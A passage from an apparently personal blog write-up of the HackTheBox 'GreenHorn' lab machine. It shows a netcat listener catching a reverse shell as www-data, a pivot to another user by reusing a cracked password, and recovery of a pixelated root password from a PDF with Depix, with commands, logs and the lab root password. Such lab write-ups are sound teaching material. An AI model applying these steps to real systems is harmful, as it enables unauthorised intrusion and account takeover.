+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen&gt; nc <span class="literal">-lvnp</span> <span class="number">9001</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">9001</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">10.10</span><span class="type">.x.x</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">10.129</span><span class="type">.243.215</span>] <span class="number">37750</span></span><br><span class="line">Linux greenhorn <span class="number">5.15</span>.<span class="number">0</span><span class="literal">-113-generic</span> <span class="comment">#123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"> <span class="number">10</span>:<span class="number">53</span>:<span class="number">08</span> up <span class="number">43</span> min,  <span class="number">0</span> users,  load average: <span class="number">0.00</span>, <span class="number">0.00</span>, <span class="number">0.00</span></span><br><span class="line">USER     TTY      FROM             LOGIN<span class="selector-tag">@</span>   IDLE   JCPU   PCPU WHAT</span><br><span class="line">uid=<span class="number">33</span>(www<span class="literal">-data</span>) gid=<span class="number">33</span>(www<span class="literal">-data</span>) groups=<span class="number">33</span>(www<span class="literal">-data</span>)</span><br><span class="line">/bin/sh: <span class="number">0</span>: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="Pivoting-to-junior-Password-reuse"><a href="#Pivoting-to-junior-Password-reuse" class="headerlink" title="Pivoting to junior - Password reuse"></a>Pivoting to junior - Password reuse</h3><p>At the beginning I just thought of how I could do the pivoting, then, I just thought of reusing the same password again :)</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">www-data@greenhorn:/home$ su junior</span><br><span class="line">su junior</span><br><span class="line">Password: iloveyou1</span><br><span class="line"></span><br><span class="line">junior@greenhorn:/home$ <span class="built_in">cd</span> junior &amp;&amp; <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cd</span> junior &amp;&amp; <span class="built_in">cat</span> user.txt</span><br><span class="line">c89fc0240226ae******************</span><br><span class="line">junior@greenhorn:~$</span><br></pre></td></tr></table></figure></div>
+<p>And we got our user flag!</p>
+<h3 id="Privilege-escalation-to-root-Depix-exploit"><a href="#Privilege-escalation-to-root-Depix-exploit" class="headerlink" title="Privilege escalation to root - Depix exploit"></a>Privilege escalation to root - Depix exploit</h3><p>On the junior home directory there was some weird pdf file:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">junior@greenhorn:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"> user.txt  <span class="string">&#x27;Using OpenVAS.pdf&#x27;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Let’s go ahead and download it: We could do that by running <code>ssh-keygen</code> command on junior, later putting our public key in the <code>.ssh/authorized_keys</code> file and just download the file using <code>scp</code> command.<br>These were the contents of the file:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/GreenHorn/blurry.png"
+                      alt="Blurry PDF"
+                ><figcaption>Blurry PDF</figcaption></figure></p>
+<p>I instantly thought of using <a class="link"   target="_blank" rel="noopener" href="https://github.com/spipm/Depix/tree/main" >Depix <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> (I’m a CTF player and I encountered this challenge countless times). You can read more about Depix to understand how it actually works.<br>Now the only trick with Depix is to know what image to use as your reference for de-blurring the pdf file, so we can do it using this one:</p>
+<div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Depix&gt; python3 .\depix.py <span class="literal">-p</span> .\pass.png <span class="literal">-s</span> .\images\searchimages\debruinseq_notepad_Windows10_closeAndSpaced.png <span class="literal">-o</span> cleartext_password.png</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">07</span>,<span class="number">462</span> - Loading pixelated image from .\pass.png</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">07</span>,<span class="number">494</span> - Loading search image from .\images\searchimages\debruinseq_notepad_Windows10_closeAndSpaced.png</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">08</span>,<span class="number">428</span> - Finding color rectangles from pixelated space</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">08</span>,<span class="number">430</span> - Found <span class="number">19</span> same color rectangles</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">08</span>,<span class="number">430</span> - <span class="number">14</span> rectangles left after moot <span class="keyword">filter</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">08</span>,<span class="number">430</span> - Found <span class="number">3</span> different rectangle sizes</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">08</span>,<span class="number">431</span> - Finding matches <span class="keyword">in</span> search image</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">08</span>,<span class="number">431</span> - Scanning <span class="number">12</span> blocks with size (<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">08</span>,<span class="number">435</span> - Scanning <span class="keyword">in</span> searchImage: <span class="number">0</span>/<span class="number">1678</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">12</span>,<span class="number">771</span> - Scanning <span class="number">1</span> blocks with size (<span class="number">1</span>, <span class="number">3</span>)</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">12</span>,<span class="number">774</span> - Scanning <span class="keyword">in</span> searchImage: <span class="number">0</span>/<span class="number">1678</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">15</span>,<span class="number">767</span> - Scanning <span class="number">1</span> blocks with size (<span class="number">14</span>, <span class="number">14</span>)</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">15</span>,<span class="number">830</span> - Scanning <span class="keyword">in</span> searchImage: <span class="number">0</span>/<span class="number">1665</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">36</span>,<span class="number">279</span> - Scanning <span class="keyword">in</span> searchImage: <span class="number">333</span>/<span class="number">1665</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">58</span>:<span class="number">56</span>,<span class="number">897</span> - Scanning <span class="keyword">in</span> searchImage: <span class="number">666</span>/<span class="number">1665</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">17</span>,<span class="number">474</span> - Scanning <span class="keyword">in</span> searchImage: <span class="number">999</span>/<span class="number">1665</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">37</span>,<span class="number">987</span> - Scanning <span class="keyword">in</span> searchImage: <span class="number">1332</span>/<span class="number">1665</span></span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">58</span>,<span class="number">540</span> - Removing blocks with no matches</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">58</span>,<span class="number">540</span> - Splitting single matches and multiple matches</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">58</span>,<span class="number">540</span> - [<span class="number">0</span> <span class="type">straight</span> <span class="type">matches</span> | <span class="number">0</span> <span class="type">multiple</span> <span class="type">matches</span>]</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">58</span>,<span class="number">541</span> - Trying geometrical matches on single<span class="operator">-match</span> squares</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">58</span>,<span class="number">541</span> - [<span class="number">0</span> <span class="type">straight</span> <span class="type">matches</span> | <span class="number">0</span> <span class="type">multiple</span> <span class="type">matches</span>]</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">58</span>,<span class="number">541</span> - Trying another pass on geometrical matches</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">58</span>,<span class="number">541</span> - [<span class="number">0</span> <span class="type">straight</span> <span class="type">matches</span> | <span class="number">0</span> <span class="type">multiple</span> <span class="type">matches</span>]</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">58</span>,<span class="number">543</span> - Writing single match results to output</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">58</span>,<span class="number">543</span> - Writing average results <span class="keyword">for</span> multiple matches to output</span><br><span class="line"><span class="number">2024</span><span class="literal">-12-06</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">58</span>,<span class="number">543</span> - Saving output image to: cleartext_password.png</span><br><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">0</span>xkujen\Depix&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>And we get our password:<br><figure class="image-caption"><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/HackTheBox/Machines/GreenHorn/password.png"
+                      alt="Cleartext password"
+                ><figcaption>Cleartext password</figcaption></figure></p>
+<p><code>root:sidefromsidetheothersidesidefromsidetheotherside</code></p>
+<p>And rooted:</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@greenhorn:~<span class="comment"># cat root.txt</span></span><br><span class="line">a1095ad7c9b638******************</span><br><span class="line">root@greenhorn:~<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
+<p>That was it for GreenHornn, hope you learned something new.<br>-0xkujen</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> Hackthebox: GreenHorn</li>
+        <li><strong>Author:</strong> Foued SAIDI</li>
+        <li><strong>Created at
+                :</strong> 2024-12-06 11:04:05</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2024-12-07 09:06:29
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://kujen5.github.io/2024/12/06/Hackthebox-GreenHorn/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/11/29/Hackthebox-Lantern/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: Lantern</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: GreenHorn</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-greenhorn-htb-3000-Gitea"><span class="nav-text">Web Application - http:&#x2F;&#x2F;greenhorn.htb:3000  - Gitea</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-greenhorn-htb-80"><span class="nav-text">Web Application - http:&#x2F;&#x2F;greenhorn.htb:80 </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pivoting-to-junior-Password-reuse"><span class="nav-text">Pivoting to junior - Password reuse</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-escalation-to-root-Depix-exploit"><span class="nav-text">Privilege escalation to root - Depix exploit</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
